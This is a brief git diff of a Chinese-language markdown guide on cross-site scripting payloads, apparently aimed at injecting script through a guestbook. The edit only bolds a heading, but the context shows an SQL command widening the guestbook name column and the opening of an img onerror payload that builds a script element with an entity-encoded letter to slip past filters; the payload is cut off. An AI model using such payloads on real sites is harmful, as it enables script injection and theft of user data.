@@ -138,7 +138,7 @@ jq操作ajax(注入字符过多，不推荐)(这里使用短链接会异常，�
 
 ```ALTER TABLE guestbook MODIFY name VARCHAR(180);```
 
-js操作原生态ajax,不用引用jquery，最节省代码,171字符
+**js操作原生态ajax,不用引用jquery，最节省代码**,171字符
 
 ```	
 	<img src=# onerror="var b= document.createElement('scr&#x69;pt');
